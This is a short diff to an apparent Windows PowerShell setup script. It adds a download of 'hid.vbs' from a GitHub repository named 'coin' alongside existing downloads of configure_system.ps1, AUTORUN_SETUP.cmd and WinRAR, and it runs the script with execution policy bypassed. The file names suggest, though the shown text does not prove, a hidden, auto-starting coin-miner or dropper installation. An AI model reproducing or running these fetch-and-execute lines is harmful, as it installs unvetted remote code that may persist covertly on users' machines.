@@ -1,4 +1,5 @@
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/hid.vbs -OutFile C:\hid.vbs
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/AUTORUN_SETUP.cmd -OutFile C:\AUTORUN_SETUP.cmd
 powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
 Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'
